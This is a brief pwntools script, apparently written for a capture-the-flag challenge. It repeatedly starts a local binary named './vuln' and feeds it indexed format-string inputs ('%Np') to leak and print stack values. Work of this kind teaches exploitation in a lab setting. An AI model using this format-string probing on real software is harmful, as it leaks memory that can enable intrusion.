from pwn import *

exe = './vuln'
context.binary = elf = ELF(exe)

for i in range(100):
    try:
        p = process(level='error')
        p.sendlineafter("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?", '%{}p'.format(i).encode())

        p.recvline()

        result = p.recvline().decode()

        if result:
            print(str(i) + ': ' + str(result).strip())

    except EOFError:
        pass

